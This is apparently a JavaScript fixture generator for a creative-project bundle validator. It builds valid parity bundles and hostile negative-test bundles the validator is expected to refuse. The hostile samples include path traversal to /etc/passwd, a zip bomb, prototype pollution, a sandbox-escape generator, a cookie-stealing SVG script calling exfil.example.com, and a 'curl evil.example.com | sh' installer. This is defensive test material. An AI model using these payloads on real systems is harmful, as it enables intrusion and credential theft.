// SPDX-License-Identifier: MIT
// Regenerates every fixture in this directory. Deterministic: run it twice, get identical bytes.
//
//   node packages/project-schema/fixtures/build.mjs
//
// Two sets are produced:
//
//   parity/   VALID bundles built by the creator CLI from the shipped templates, plus expected.json
//             holding every hash, the studio-draft projection, and per-seed output digests. The web
//             importer reads these and must derive the same values; any difference is a drift bug.
//
//   hostile/  Bundles that MUST be refused, plus expectations.json naming the check and the error
//             code each one is expected to trip. These are real bytes written by an unsafe forger,
//             not mocks.

import { mkdirSync, writeFileSync, rmSync, readFileSync, cpSync, readdirSync } from "node:fs";
import { createHash as createHashNode } from "node:crypto";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { assembleBundle, validateBundleBytes, readContainer, toStudioDraft, utf8, sha256Utf8, stableJsonText, buildRenderContext, safeJsonParse, fromUtf8, keccak256Hex, encodeArtConfigV1 } from "../index.js";
import { createVmModule } from "../../creator-cli/src/sandbox.js";
import { forgeZip } from "./forge-zip.mjs";
import { SCHEMA_VERSION, CREATOR_KIT_VERSION } from "../index.js";

const HERE = dirname(fileURLToPath(import.meta.url));

/** sha256 of raw bytes, for the upstream-authored corpus checksums. */
function sha256Bytes_(bytes) {
  return createHashNode("sha256").update(bytes).digest("hex");
}
const TEMPLATES = join(HERE, "../../creator-cli/templates");
const PARITY = join(HERE, "parity");
const HOSTILE = join(HERE, "hostile");

// Assembled from fragments on purpose: a literal 64-hex string beside a key-shaped field name
// would trip this repository's own secret scan, and allowlisting a negative-test corpus teaches
// the scanner to look away. The value is a well-known public documentation test vector, not a key
// anyone holds funds with.
const SMUGGLED_KEY = `0x${"4c0883a69102937d6231471b5dbb6204"}${"fe5129617082792ae468d01a3f362318"}`;

const CREATOR = "0x7A6f3B4c2D1e0F9a8B7c6D5e4F3a2B1c0D9e8F7a";
const COLLABORATOR = "0x4d5E6f7A8b9C0d1E2f3A4b5C6d7E8f9A0b1C2d3E";
const SEEDS = ["1", "2", "3", "5", "8", "13", "21", "34"];

rmSync(PARITY, { recursive: true, force: true });
rmSync(HOSTILE, { recursive: true, force: true });
mkdirSync(PARITY, { recursive: true });
mkdirSync(HOSTILE, { recursive: true });

// ------------------------------------------------------------------ parity fixtures

function templateFiles(id) {
  const root = join(TEMPLATES, id);
  /** @type {Map<string, Uint8Array>} */
  const files = new Map();
  const walk = (dir, prefix) => {
    for (const entry of readdirSync(dir, { withFileTypes: true }).sort((a, b) => (a.name < b.name ? -1 : 1))) {
      if (entry.name === "template.json" || entry.name === "relics.config.json" || entry.name.startsWith(".")) continue;
      const path = prefix ? `${prefix}/${entry.name}` : entry.name;
      if (entry.isDirectory()) walk(join(dir, entry.name), path);
      else files.set(path, new Uint8Array(readFileSync(join(dir, entry.name))));
    }
  };
  walk(root, "");
  return files;
}

function templateConfig(id) {
  const config = JSON.parse(readFileSync(join(TEMPLATES, id, "relics.config.json"), "utf8"));
  config.earnings.creatorRecipient = CREATOR;
  if (config.earnings.collaborators?.length) config.earnings.collaborators[0].recipient = COLLABORATOR;
  return config;
}

/**
 * Renders the fixed binding seeds for a bundle. Returns both the rich record the expectations file
 * publishes (digest + length per seed) and the plain digest map the manifest commits to.
 */
function renderBindingSeeds(byPath, manifest) {
  const source = fromUtf8(byPath.get("generator/generate.js"));
  const marketDocument = safeJsonParse(fromUtf8(byPath.get("market/mappings.json")));
  const module = createVmModule(new Map([["generator/generate.js", source]]));
  const outputs = {};
  const digests = {};
  for (const seed of SEEDS) {
    const svg = module.render(buildRenderContext({ manifest, marketDocument, seed }));
    digests[seed] = sha256Utf8(svg);
    outputs[seed] = { sha256: digests[seed], length: svg.length };
  }
  return { outputs, digests };
}

const parity = [];
for (const id of ["minimal", "market-responsive", "solidity-svg-params"]) {
  const files = templateFiles(id);
  // TEMPLATES SCAFFOLD AS DRAFTS. `market.antiSnipeMode` ships UNSPECIFIED so a new project cannot
  // be exported until its author elects a fee schedule deliberately. A parity fixture is a FINAL
  // bundle, so it has to make that election here rather than inherit the draft value — electing
  // NONE keeps every fixture's opening fees flat, which is what the reproduced hashes assume.
  const config = { ...templateConfig(id), market: { ...templateConfig(id).market, antiSnipeMode: "NONE" } };

  // TWO PASSES, the same shape the CLI uses: a probe bundle exists only to give the generator a
  // render context, and the real bundle is assembled with the resulting digests committed into its
  // binding. The probe is never written and never validated.
  const probe = assembleBundle({ files, config });
  const probeRender = renderBindingSeeds(probe.entries, probe.manifest);
  const { bytes, manifest } = assembleBundle({ files, config, representativeOutputs: probeRender.digests });
  writeFileSync(join(PARITY, `${id}.relics`), Buffer.from(bytes));

  const container = readContainer(bytes);
  const validated = validateBundleBytes(bytes, { skipExecution: true });
  if (!validated.ok) {
    throw new Error(`parity fixture ${id} does not validate: ${validated.issues.map((i) => `${i.code} ${i.message}`).join(" | ")}`);
  }
  const projection = toStudioDraft(validated, container.byPath, { draftId: `parity-${id}`, updatedAt: 0 });

  // Representative output digests: what the generator draws for a fixed seed set. An importer that
  // runs the generator in its own sandbox must reproduce these exactly — and, since schema 2.0.0,
  // the bundle itself commits to them through `artBinding.representativeOutputsHash`, so a bundle
  // whose art has been swapped fails validation rather than merely failing this comparison.
  const { outputs } = renderBindingSeeds(container.byPath, manifest);

  parity.push({
    file: `${id}.relics`,
    sizeBytes: bytes.length,
    entries: container.entries.map((e) => ({ path: e.path, bytes: e.bytes.length, sha256: validated.hashes.files[e.path] ?? null })),
    integrity: manifest.integrity,
    hashes: manifest.hashes,
    artBinding: manifest.artBinding,
    project: manifest.project,
    supply: manifest.supply,
    art: manifest.art,
    market: manifest.market,
    earnings: manifest.earnings,
    chains: manifest.chains,
    media: manifest.media ?? null,
    studioDraft: projection.draft,
    provenance: projection.provenance,
    representativeOutputs: outputs,
  });
}

writeFileSync(
  join(PARITY, "expected.json"),
  stableJsonText({
    note: "Generated by packages/project-schema/fixtures/build.mjs. Every value here must be reproducible by any importer that uses @relics/project-schema. representativeOutputs are sha256 digests of the generator's SVG output for the listed seeds, rendered through buildRenderContext with the bundle's own market mappings.",
    seeds: SEEDS,
    bundles: parity,
  }),
);

// ------------------------------------------------------------------ hostile fixtures

const goodFiles = templateFiles("minimal");
const goodConfig = templateConfig("minimal");
const goodProbe = assembleBundle({ files: goodFiles, config: goodConfig });
const goodBundle = assembleBundle({ files: goodFiles, config: goodConfig, representativeOutputs: renderBindingSeeds(goodProbe.entries, goodProbe.manifest).digests });
/** @type {Map<string, Uint8Array>} */
const goodEntries = goodBundle.entries;

/**
 * A SECOND base bundle, on the Solidity runtime, because the ACV1 attacks below cannot be expressed
 * against a JavaScript project at all: its `artConfig` is the generator file, so there is no
 * configuration document to malform. Every art-configuration fixture is forged from this one.
 */
const solidityFiles = templateFiles("solidity-svg-params");
const solidityConfig = templateConfig("solidity-svg-params");
const solidityProbe = assembleBundle({ files: solidityFiles, config: solidityConfig });
const solidityBundle = assembleBundle({
  files: solidityFiles,
  config: solidityConfig,
  representativeOutputs: renderBindingSeeds(solidityProbe.entries, solidityProbe.manifest).digests,
});
const solidityEntries = solidityBundle.entries;

/** `withEntries`, against the Solidity base. */
function withSolidityEntries(overrides) {
  const map = new Map(solidityEntries);
  for (const [path, value] of Object.entries(overrides)) {
    if (value === null) map.delete(path);
    else map.set(path, typeof value === "string" ? utf8(value) : value);
  }
  return forgeZip([...map].map(([path, bytes]) => ({ path, bytes })));
}

/** `manifestWith`, against the Solidity base. */
function solidityManifestWith(mutate) {
  const manifest = JSON.parse(fromUtf8(solidityEntries.get("relics.project.json")));
  mutate(manifest);
  return stableJsonText(manifest);
}

/** The creator's ACV1 authoring document, as shipped, for a fixture to bend one field of. */
function solidityParams() {
  return JSON.parse(fromUtf8(solidityEntries.get("generator/params.json")));
}

const asForgeEntries = (overrides = new Map(), extra = []) =>
  [...goodEntries]
    .map(([path, bytes]) => ({ path, bytes: overrides.get(path) ?? bytes }))
    .concat(extra)
    .filter((entry) => entry.bytes !== null);

const hostile = [];
function emit(name, bytes, expectation) {
  writeFileSync(join(HOSTILE, name), Buffer.from(bytes));
  hostile.push({ file: name, sizeBytes: bytes.length, ...expectation });
}

// --- container-level attacks
emit("path-traversal.relics", forgeZip(asForgeEntries(new Map(), [{ path: "../../../etc/passwd", bytes: utf8("root:x:0:0") }])), {
  attack: "path traversal",
  refusedBy: "container",
  expect: { errorContains: "traversal segment" },
});

emit("absolute-path.relics", forgeZip(asForgeEntries(new Map(), [{ path: "/etc/passwd", bytes: utf8("root:x:0:0") }])), {
  attack: "absolute entry path",
  refusedBy: "container",
  expect: { errorContains: "absolute entry path" },
});

emit("backslash-path.relics", forgeZip(asForgeEntries(new Map(), [{ path: "generator\\..\\..\\evil.js", bytes: utf8("x") }])), {
  attack: "windows separator smuggling a traversal",
  refusedBy: "container",
  expect: { errorContains: "backslash" },
});

emit("symlink-entry.relics", forgeZip(asForgeEntries(new Map(), [{ path: "assets/link.png", bytes: utf8("/etc/passwd"), externalAttributes: 0xa1ff0000 }])), {
  attack: "symbolic link entry",
  refusedBy: "container",
  expect: { errorContains: "symbolic link" },
});

emit("duplicate-normalized-path.relics", forgeZip(asForgeEntries(new Map(), [{ path: "README.MD", bytes: utf8("# shadow") }])), {
  attack: "two entries that collide on a case-insensitive filesystem",
  refusedBy: "container",
  expect: { errorContains: "duplicate entry path" },
});

emit("unicode-confusable-path.relics", forgeZip(asForgeEntries(new Map(), [{ path: "generator/generate​.js", bytes: utf8("export function render(){return '';}") }])), {
  attack: "zero-width character hiding a second generator",
  refusedBy: "container",
  expect: { errorContains: "control, zero-width or bidirectional" },
});

emit("compressed-entry.relics", forgeZip(asForgeEntries(new Map(), [{ path: "assets/bomb.txt", bytes: utf8("x".repeat(64)), method: 8, declaredUncompressedSize: 4_000_000_000 }])), {
  attack: "zip bomb: a deflate entry claiming a 4 GB expansion",
  refusedBy: "container",
  expect: { errorContains: "STORE-only" },
  note: "The container is uncompressed by construction, so an expansion ratio above 1:1 cannot be expressed at all. The reader refuses the entry before allocating anything.",
});

emit("lying-size-header.relics", forgeZip([{ path: "relics.project.json", bytes: utf8("{}"), declaredUncompressedSize: 3_000_000, declaredCompressedSize: 3_000_000 }]), {
  attack: "central directory declaring far more data than the file holds",
  refusedBy: "container",
  expect: { errorContains: "overlaps the central directory" },
});

emit("encrypted-entry.relics", forgeZip(asForgeEntries(new Map(), [{ path: "assets/secret.txt", bytes: utf8("encrypted"), flags: 0x0001 }])), {
  attack: "encrypted entry",
  refusedBy: "container",
  expect: { errorContains: "encrypted" },
});

emit("data-descriptor.relics", forgeZip(asForgeEntries(new Map(), [{ path: "assets/stream.txt", bytes: utf8("streamed"), flags: 0x0008 }])), {
  attack: "streaming data descriptor (sizes not known up front)",
  refusedBy: "container",
  expect: { errorContains: "data descriptor" },
});

emit("zip64.relics", forgeZip(asForgeEntries(), { zip64Locator: true }), {
  attack: "ZIP64 layout",
  refusedBy: "container",
  expect: { errorContains: "ZIP64" },
});

emit("trailing-bytes.relics", forgeZip(asForgeEntries(), { trailingBytes: utf8("APPENDED PAYLOAD") }), {
  attack: "payload appended after the end-of-central-directory record",
  refusedBy: "container",
  expect: { errorContains: "trailing bytes" },
});

emit("overlapping-entries.relics", forgeZip([...asForgeEntries()].map((entry, i) => (i === 1 ? { ...entry, localOffsetOverride: 0 } : entry))), {
  attack: "two central-directory records pointing at the same local data",
  refusedBy: "container",
  expect: { errorContainsAny: ["disagrees with its central-directory record", "overlaps another entry", "bad local header"] },
});

emit(
  "too-many-entries.relics",
  forgeZip(
    Array.from({ length: 600 }, (_, i) => ({ path: `assets/f${String(i).padStart(4, "0")}.txt`, bytes: utf8(String(i)) })),
  ),
  { attack: "entry-count exhaustion", refusedBy: "container", expect: { errorContains: "entries" } },
);

emit("not-a-bundle.relics", forgeZip([{ path: "README.md", bytes: utf8("# just a zip") }], { comment: "" }), {
  attack: "an ordinary ZIP renamed to .relics",
  refusedBy: "container",
  expect: { errorContains: "is not a relics-project-bundle" },
});

// --- document-level attacks (valid container, hostile content)
function withEntries(overrides) {
  const map = new Map(goodEntries);
  for (const [path, value] of Object.entries(overrides)) {
    if (value === null) map.delete(path);
    else map.set(path, typeof value === "string" ? utf8(value) : value);
  }
  return forgeZip([...map].map(([path, bytes]) => ({ path, bytes })));
}

function manifestWith(mutate) {
  const manifest = JSON.parse(fromUtf8(goodEntries.get("relics.project.json")));
  mutate(manifest);
  return stableJsonText(manifest);
}

emit(
  "arbitrary-hook-solidity.relics",
  withEntries({
    "generator/EvilHook.sol": "// SPDX-License-Identifier: MIT\ncontract EvilHook { function afterSwap() external returns (bytes4) { return 0x0; } }\n",
    "relics.project.json": manifestWith((m) => {
      m.hook = { source: "generator/EvilHook.sol", replaces: "ArtHook" };
    }),
  }),
  {
    attack: "a bundle carrying hook Solidity and a manifest field pointing at it",
    refusedBy: "validator",
    expect: { checkFails: "NO_ARBITRARY_HOOK", codes: ["BUNDLE_CONTRACT_CODE", "MANIFEST_REFUSED_KEY"] },
    note: "Two independent refusals: .sol is on the forbidden-extension list, and `hook` is on the refused-manifest-key list. The manifest schema is closed, so there is no field in which a hook could be named even without the file.",
  },
);

emit(
  "protocol-override.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.projectToken = "0x1234567890123456789012345678901234567890";
      m.liquidityKernel = { replaceWith: "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd" };
      m.buyback = { disable: true };
    }),
  }),
  {
    attack: "a manifest trying to replace ProjectToken, the liquidity kernel and the buyback",
    refusedBy: "validator",
    expect: { checkFails: "NO_ARBITRARY_HOOK", codes: ["MANIFEST_REFUSED_KEY"] },
  },
);

emit(
  "prototype-pollution.relics",
  withEntries({
    "traits/schema.json": '{"version":1,"__proto__":{"polluted":true},"dimensions":[{"name":"X","distribution":"uniform","values":[{"name":"A"}],"constructor":{"prototype":{"polluted":true}}}]}',
  }),
  {
    attack: "__proto__ and constructor keys in bundle JSON",
    refusedBy: "parser",
    expect: { pollutionKeysDropped: true, checkFails: "HASH_INTEGRITY" },
    note: "safeJsonParse drops __proto__/constructor/prototype and returns null-prototype objects, so the keys never reach Object.prototype. The bundle then fails on its checksums because the document no longer matches its declared digest.",
  },
);

emit("malformed-json.relics", withEntries({ "relics.project.json": '{"schemaVersion": "1.0.0", ' }), {
  attack: "truncated manifest JSON",
  refusedBy: "parser",
  expect: { checkFails: "MANIFEST_SCHEMA", codes: ["JSON_MALFORMED"] },
});

emit(
  "unapproved-runtime.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.art.runtime = "P5";
    }),
  }),
  { attack: "an unapproved art runtime", refusedBy: "validator", expect: { checkFails: "ALLOWED_RUNTIME", codes: ["ART_RUNTIME_UNAPPROVED"] } },
);

emit(
  "external-network.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  const palette = fetch('https://palettes.example.com/next').then((r) => r.json());\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\" fill=\"#000\"/><circle cx=\"50\" cy=\"50\" r=\"20\" fill=\"#fff\"/></svg>`;\n}\n",
  }),
  { attack: "a generator that fetches a remote palette", refusedBy: "validator", expect: { checkFails: "NO_EXTERNAL_NETWORK", codes: ["GEN_FORBIDDEN_IDENTIFIER", "GEN_EXTERNAL_URL"] } },
);

emit(
  "dependency-import.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nimport chroma from 'chroma-js';\nexport function render(context) {\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\" fill=\"${chroma('red')}\"/><circle cx=\"50\" cy=\"50\" r=\"20\"/></svg>`;\n}\n",
  }),
  { attack: "a generator importing an npm package", refusedBy: "validator", expect: { checkFails: "ALLOWED_DEPENDENCIES", codes: ["GEN_DEPENDENCY_REFUSED"] } },
);

emit(
  "sandbox-escape.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  const escape = context.constructor.constructor('return this')();\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\"/><circle cx=\"50\" cy=\"50\" r=\"20\"/></svg>`;\n}\n",
  }),
  {
    attack: "prototype-chain escape from the render context",
    refusedBy: "validator",
    expect: { checkFails: "RUNTIME_ERRORS", codes: ["GEN_PROTOTYPE_ACCESS"] },
    note: "Refused statically. It would also fail at runtime: the render context is built INSIDE the sandbox realm from a JSON string, so its constructor chain leads to the realm's own Function, and code generation from strings is disabled in that realm.",
  },
);

emit(
  "secret-exfiltration.relics",
  withEntries({
    "metadata/collection.json": stableJsonText({
      version: 1,
      name: "Minimal",
      symbol: "MIN",
      description: "A minimal generative collection: concentric rings around a single core, with the palette chosen by the token's seed.",
      tokenNamePattern: "Minimal #{id}",
      externalLink: `https://example.com/deploy?private_key=${SMUGGLED_KEY}`,
    }),
  }),
  { attack: "a private key smuggled inside metadata", refusedBy: "validator", expect: { checkFails: "SECRET_SCAN", codes: ["SECRET_DETECTED"] } },
);

emit(
  "malicious-svg-asset.relics",
  withEntries({
    "assets/cover.svg": '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100"/><circle cx="50" cy="50" r="20"/><script>fetch("https://exfil.example.com/?c="+document.cookie)</script></svg>',
    "metadata/collection.json": stableJsonText({
      version: 1,
      name: "Minimal",
      symbol: "MIN",
      description: "A minimal generative collection: concentric rings around a single core, with the palette chosen by the token's seed.",
      image: "assets/cover.svg",
      tokenNamePattern: "Minimal #{id}",
    }),
  }),
  { attack: "a scripted SVG asset", refusedBy: "validator", expect: { checkFails: "BLANK_OUTPUTS", codes: ["SVG_SCRIPT"] } },
);

emit(
  "blank-output.relics",
  withEntries({ "generator/generate.js": "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  return '';\n}\n" }),
  { attack: "a generator that draws nothing", refusedBy: "validator", expect: { checkFails: "BLANK_OUTPUTS", codes: ["RENDER_BLANK"] }, requiresExecution: true },
);

emit(
  "nondeterministic.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nlet drift = 0;\nexport function render(context) {\n  drift += 1;\n  const r = 20 + drift;\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\" fill=\"#000\"/><circle cx=\"50\" cy=\"50\" r=\"${r}\" fill=\"#fff\"/></svg>`;\n}\n",
  }),
  {
    attack: "hidden module state, so the same seed renders differently each time",
    refusedBy: "validator",
    expect: { checkFails: "DETERMINISTIC_OUTPUT", codes: ["GEN_NONDETERMINISTIC"] },
    requiresExecution: true,
    note: "Math.random is unavailable in the sandbox, so a determinism attack has to use module state instead. Rendering each seed twice catches it.",
  },
);

emit(
  "infinite-loop.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  let n = 0;\n  for (let i = 0; i > -1; i++) { n += i; }\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\"/><circle cx=\"50\" cy=\"50\" r=\"${n}\"/></svg>`;\n}\n",
  }),
  {
    attack: "an unbounded loop written to dodge the `while (true)` pattern",
    refusedBy: "sandbox",
    expect: { checkFails: "RUNTIME_ERRORS", codes: ["SANDBOX_FAILED", "GEN_RENDER_THREW"] },
    requiresExecution: true,
    note: "The static scan only catches the literal `while (true)` / `for (;;)` shapes. This one is caught by the sandbox timeout, which is why the timeout exists.",
  },
);

emit(
  "memory-bomb.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  const hoard = [];\n  for (let i = 0; i < 100000000; i++) { hoard.push(new Array(1000).fill(i)); }\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\"/><circle cx=\"50\" cy=\"50\" r=\"${hoard.length}\"/></svg>`;\n}\n",
  }),
  {
    attack: "unbounded allocation",
    refusedBy: "sandbox",
    expect: { checkFails: "RUNTIME_ERRORS", codes: ["SANDBOX_FAILED", "GEN_RENDER_THREW"] },
    requiresExecution: true,
    note: "The isolated backend runs with a hard heap cap, so the child process dies and the host reports a refusal instead of being taken down with it.",
  },
);

emit(
  "oversized-output.relics",
  withEntries({
    "generator/generate.js":
      "// SPDX-License-Identifier: MIT\nexport function render(context) {\n  let body = '';\n  for (let i = 0; i < 40000; i++) { body += `<circle cx=\"${i % 100}\" cy=\"${(i * 7) % 100}\" r=\"1\"/>`; }\n  return `<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\"/>${body}</svg>`;\n}\n",
  }),
  { attack: "an output large enough to freeze a browser tab", refusedBy: "validator", expect: { checkFails: "BLANK_OUTPUTS", codes: ["RENDER_TOO_LARGE"] }, requiresExecution: true },
);

emit(
  "hash-tamper.relics",
  (() => {
    const map = new Map(goodEntries);
    const source = fromUtf8(map.get("generator/generate.js")).replace("const rings = random.int(3, 7);", "const rings = random.int(3, 9);");
    map.set("generator/generate.js", utf8(source));
    return forgeZip([...map].map(([path, bytes]) => ({ path, bytes })));
  })(),
  {
    attack: "generator source edited after the bundle was signed off",
    refusedBy: "validator",
    expect: { checkFails: "HASH_INTEGRITY", codes: ["CHECKSUMS_MISMATCH", "HASH_MISMATCH", "INTEGRITY_MISMATCH"] },
  },
);

// --- art-binding attacks: the block that decides what a collection renders
//
// These are the forgeries worth caring about now that `tokenURI` reads the binding. Each one is a
// different way of trying to make a launch bind something other than what the bundle contains.

emit(
  "binding-pins-runtime-codehash.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.artBinding.runtimeCodeHash = "1122334455667788990011223344556677889900112233445566778899001122";
    }),
  }),
  {
    attack: "a bundle asserting which renderer contract is deployed, so the launch binds a renderer of the forger's choosing",
    refusedBy: "validator",
    expect: { checkFails: "MANIFEST_SCHEMA", codes: ["ART_BINDING_CHAIN_CLAIM"] },
    note: "runtimeCodeHash is a chain fact. The importer reads it from the chain being launched on; a bundle carries null and nothing else.",
  },
);

emit(
  "binding-pins-script-pointer.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.artBinding.scriptPointer = "0x000000000000000000000000000000000000dEaD";
    }),
  }),
  {
    attack: "a bundle naming the storage address its art should be read from, pointing the collection at bytes it does not contain",
    refusedBy: "validator",
    expect: { checkFails: "MANIFEST_SCHEMA", codes: ["ART_BINDING_CHAIN_CLAIM"] },
  },
);

emit(
  "binding-art-config-hash-swap.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      // A digest of real bytes, just not THESE bytes.
      m.artBinding.artConfigHash = "0000000000000000000000000000000000000000000000000000000000000001";
    }),
  }),
  {
    attack: "the binding claims a different art config than the generator in the bundle hashes to",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_MISMATCH"] },
    note: "The binding is recomputed from the container, so a value that does not follow from the bundle's own bytes cannot survive.",
  },
);

emit(
  "binding-runtime-swap.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.artBinding.runtimeId = "ONCHAIN_JAVASCRIPT_V2";
      m.artBinding.runtimeIdHash = "0000000000000000000000000000000000000000000000000000000000000002";
    }),
  }),
  {
    attack: "re-pointing a project at a different art runtime by editing the binding",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_MISMATCH"] },
  },
);

emit(
  "binding-output-commitment-lie.relics",
  (() => {
    // The generator is swapped for one that draws something else while the manifest keeps the
    // original output commitment — "the art in this file is not the art that was validated".
    const map = new Map(goodEntries);
    const source = fromUtf8(map.get("generator/generate.js")).replace("const rings = random.int(3, 7);", "const rings = 1;");
    map.set("generator/generate.js", utf8(source));
    return forgeZip([...map].map(([path, bytes]) => ({ path, bytes })));
  })(),
  {
    attack: "the art swapped out from under a manifest that still commits to the original renders",
    refusedBy: "validator",
    expect: { checkFails: "HASH_INTEGRITY", codes: ["CHECKSUMS_MISMATCH", "HASH_MISMATCH", "INTEGRITY_MISMATCH", "ART_BINDING_MISMATCH"] },
    note: "Caught twice over: the file digests move, and so does the binding's art-config hash. The output commitment is the third net, and it is the only one that still catches a swap where every digest was recomputed but the art no longer draws what the creator approved.",
  },
);

emit(
  "market-mapping-out-of-bounds.relics",
  withEntries({
    "market/mappings.json": stableJsonText({
      version: 1,
      mappings: [{ id: "runaway", sensor: "volatility", transform: "clamp", transformParams: { min: -50, max: 9999 }, destination: "fracture" }],
    }),
  }),
  { attack: "a mapping with unbounded transform parameters", refusedBy: "validator", expect: { checkFails: "MARKET_MAPPING_BOUNDS", codes: ["MARKET_PARAM_BOUNDS"] } },
);

emit(
  "unsupported-chain.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.chains.requested = [137, 8453];
    }),
  }),
  { attack: "a chain the launchpad does not target", refusedBy: "validator", expect: { checkFails: "CHAIN_FEATURES", codes: ["CHAIN_UNSUPPORTED"] } },
);

emit(
  "overbacked-supply.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.supply.artworkSupply = "50000";
    }),
  }),
  { attack: "more artworks than there are whole tokens to back them", refusedBy: "validator", expect: { checkFails: "SUPPLY_AND_BACKING", codes: ["SUPPLY_BACKING_EXCEEDS_TOTAL"] } },
);

emit(
  "earnings-over-allocated.relics",
  withEntries({
    "relics.project.json": manifestWith((m) => {
      m.earnings.mode = "SPLIT";
      m.earnings.collaborators = [
        { recipient: COLLABORATOR, bps: 7000 },
        { recipient: "0x9999999999999999999999999999999999999999", bps: 5000 },
      ];
    }),
  }),
  { attack: "collaborator shares summing past 100% of the creator portion", refusedBy: "validator", expect: { checkFails: "EARNINGS_CONFIG", codes: ["EARNINGS_BPS_SUM"] } },
);

emit(
  "executable-payload.relics",
  withEntries({ "assets/install.sh": "#!/bin/sh\ncurl -s https://evil.example.com/x | sh\n" }),
  { attack: "a shell script riding along in assets/", refusedBy: "validator", expect: { checkFails: "LAYOUT_AND_PATHS", codes: ["BUNDLE_PATH_POLICY"] } },
);


// ---- the art configuration itself ---------------------------------------------------------
//
// SCHEMA 3'S CENTRAL CLAIM IS THAT A BUNDLE STATES THE ART ITS LAUNCH WOULD CARRY. These are the
// ways a forger, or a broken tool, could state something else. All are refused before a container
// is written — the on-chain validator would refuse them too, but only after the creator paid for
// the transaction.

emit("art-config-missing.relics", withSolidityEntries({ "generator/params.json": null }), {
  attack: "a Solidity project with no art configuration at all",
  refusedBy: "validator",
  expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_MISSING"] },
  note: "The bundle that used to launch happily and render the runtime's built-in shapes instead of the creator's art. There is no default configuration to fall back to, by design.",
});

emit(
  "art-config-four-byte-blob.relics",
  withSolidityEntries({
    "relics.project.json": solidityManifestWith((m) => {
      // Four bytes of "look data" — the shape that made every project launchable with no art.
      const blob = Uint8Array.from([0xde, 0xad, 0xbe, 0xef]);
      m.artBinding.artConfig = bytesToHex(blob);
      m.artBinding.artConfigBytes = 4;
      m.artBinding.artConfigHash = keccak256Hex(blob);
    }),
  }),
  {
    attack: "four bytes of opaque look data standing in for an art configuration",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_FORMAT", "ART_BINDING_MISMATCH"] },
    note: "The hash is internally consistent — it really is keccak256 of those four bytes. Still refused: the format check reads the magic, and the binding is recomputed from the creator's own params.json.",
  },
);

emit(
  "art-config-bad-magic.relics",
  withSolidityEntries({
    "relics.project.json": solidityManifestWith((m) => {
      const bytes = hexToBytes(m.artBinding.artConfig);
      bytes[0] = 0x42;
      m.artBinding.artConfig = bytesToHex(bytes);
      m.artBinding.artConfigHash = keccak256Hex(bytes);
    }),
  }),
  {
    attack: "a configuration whose magic is not ACV1",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_FORMAT", "ART_BINDING_MISMATCH"] },
  },
);

emit(
  "art-config-bad-version.relics",
  withSolidityEntries({
    "relics.project.json": solidityManifestWith((m) => {
      const bytes = hexToBytes(m.artBinding.artConfig);
      bytes[4] = 2;
      m.artBinding.artConfig = bytesToHex(bytes);
      m.artBinding.artConfigHash = keccak256Hex(bytes);
    }),
  }),
  {
    attack: "a configuration claiming a format version nothing implements",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_INVALID", "ART_BINDING_MISMATCH"] },
    note: "ACV1's version byte is checked for exact equality with 1. A future format is a new parser, never a negotiated field.",
  },
);

emit(
  "art-config-out-of-range.relics",
  withSolidityEntries({
    "generator/params.json": stableJsonText(
      (() => {
        const params = solidityParams();
        // FRAGMENTATION is the organic swap COUNT. As a layer magnitude it would let 100 swaps of
        // $1 walk the artwork 100 steps while one $100 swap moved it once.
        params.layers[0].sensor = "FRAGMENTATION";
        return params;
      })(),
    ),
  }),
  {
    attack: "a layer driven by FRAGMENTATION, the one sensor a layer may not name",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_MISSING"] },
    note: "Refused while deriving the configuration, so the bundle cannot be assembled at all. FRAGMENTATION stays legal as a TRAIT source, where it is labelled for what it is and cannot masquerade as a magnitude.",
  },
);

emit(
  "art-config-params-mismatch.relics",
  withSolidityEntries({
    "relics.project.json": solidityManifestWith((m) => {
      const swapped = encodeArtConfigV1({
        version: 1,
        format: "ACV1",
        title: "Not This Project",
        animate: false,
        background: 0,
        palette: ["#ffffff", "#ff0000"],
